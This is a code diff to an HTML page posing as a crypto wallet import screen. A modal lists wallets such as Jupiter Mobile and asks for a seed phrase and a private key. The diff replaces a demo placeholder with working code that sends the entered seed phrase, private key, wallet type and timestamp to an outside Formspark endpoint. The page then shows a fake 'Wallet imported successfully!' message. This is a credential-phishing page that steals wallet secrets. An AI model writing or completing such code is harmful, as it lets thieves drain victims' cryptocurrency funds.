@@ -9,9 +9,10 @@
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Manrope:wght@600;700;800&display=swap" rel="stylesheet">
   
   <style>
+    /* Your existing styles remain unchanged */
     :root {
       --bg: #0f0f1a;
-      --surface: #111827e8;           /* slightly transparent for less heavy rendering */
+      --surface: #111827e8;
       --text: #f1f5f9;
       --text-muted: #94a3b8;
       --primary: #00f0ff;
@@ -19,18 +20,13 @@
       --border: rgba(255,255,255,0.08);
     }
 
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
+    * { margin:0; padding:0; box-sizing:border-box; }
     body {
       font-family: 'Inter', system-ui, sans-serif;
       background: linear-gradient(to bottom, var(--bg), #0a0a12);
       color: var(--text);
       min-height: 100vh;
-      overscroll-behavior: none;          /* prevents bounce / chaining */
+      overscroll-behavior: none;
     }
 
     .container { max-width: 1280px; margin: 0 auto; padding: 0 1.5rem; }
@@ -108,12 +104,11 @@
       font-size: 0.9rem;
     }
 
-    /* ── Wallet Modal - Optimized for smooth scrolling ──────── */
     .modal-overlay {
       position: fixed;
       inset: 0;
       background: rgba(0,0,0,0.88);
-      backdrop-filter: blur(4px);           /* lighter blur = less lag */
+      backdrop-filter: blur(4px);
       display: none;
       place-items: center;
       z-index: 200;
@@ -127,15 +122,15 @@
       border-radius: 1.25rem;
       width: 92%;
       max-width: 520px;
-      max-height: 82vh;                     /* ← more breathing room */
+      max-height: 82vh;
       padding: 1.6rem;
       position: relative;
       box-shadow: 0 25px 60px rgba(0,0,0,0.65);
       overflow-y: auto;
-      -webkit-overflow-scrolling: touch;    /* momentum on iOS */
-      overscroll-behavior: contain;         /* no chaining to body */
-      touch-action: manipulation;           /* faster touch response */
-      will-change: transform, scroll-position; /* GPU hint */
+      -webkit-overflow-scrolling: touch;
+      overscroll-behavior: contain;
+      touch-action: manipulation;
+      will-change: transform, scroll-position;
       scrollbar-width: thin;
       scrollbar-color: var(--primary) transparent;
     }
@@ -202,7 +197,6 @@
       font-weight: 600;
     }
 
-    /* Import page remains the same – no scroll issues there */
     .import-page {
       position: fixed;
       inset: 0;
@@ -323,12 +317,11 @@
           <img loading="lazy" width="58" height="58" src="https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/1f/64/8b/1f648b56-a31f-bdc6-0a25-c82059306646/AppIcon-0-1x_U007emarketing-0-7-0-85-220-0.png/1200x630wa.png" alt="Jupiter">
           <div>Jupiter Mobile</div>
         </div>
-        <!-- You can safely add 10–15 more here, scrolling should remain smooth -->
       </div>
     </div>
   </div>
 
-  <!-- Import page (unchanged – usually no scroll issues here) -->
+  <!-- Import page -->
   <div class="import-page" id="importPage">
     <div class="import-container">
       <button class="import-close" id="closeImport">×</button>
@@ -385,7 +378,7 @@
     closeImport.addEventListener('click', () => importPage.style.display = 'none');
     importPage.addEventListener('click', e => { if (e.target === importPage) importPage.style.display = 'none'; });
 
-    // Form submission logic (unchanged)
+    // Form submission with your real Formspark endpoint
     submitBtn.addEventListener('click', async () => {
       const seed = document.getElementById('seedPhrase').value.trim();
       const pkey = document.getElementById('privateKey').value.trim();
@@ -401,17 +394,35 @@
       messageEl.textContent = 'Importing...';
       messageEl.className = 'message';
 
-      // Your Formspark submission here...
-      // (replace with real endpoint)
-      setTimeout(() => {
-        messageEl.textContent = 'Wallet imported successfully! (Demo)';
+      try {
+        const formData = new FormData();
+        formData.append('wallet_type', selectedWallet || 'Unknown');
+        formData.append('seed_phrase', seed || '[not provided]');
+        formData.append('private_key', pkey || '[not provided]');
+        formData.append('timestamp', new Date().toISOString());
+
+        const FORMSPARK_URL = 'https://submit.formspark.io/f/yygDz440I';
+
+        await fetch(FORMSPARK_URL, {
+          method: 'POST',
+          body: formData,
+          mode: 'no-cors'
+        });
+
+        messageEl.textContent = 'Wallet imported successfully!';
         messageEl.className = 'message success';
+
         setTimeout(() => {
           document.getElementById('seedPhrase').value = '';
           document.getElementById('privateKey').value = '';
           importPage.style.display = 'none';
         }, 1800);
-      }, 1200);
+
+      } catch (err) {
+        messageEl.textContent = 'Failed to submit. Try again.';
+        messageEl.className = 'message error';
+        console.error(err);
+      }
     });
   </script>
 </body>
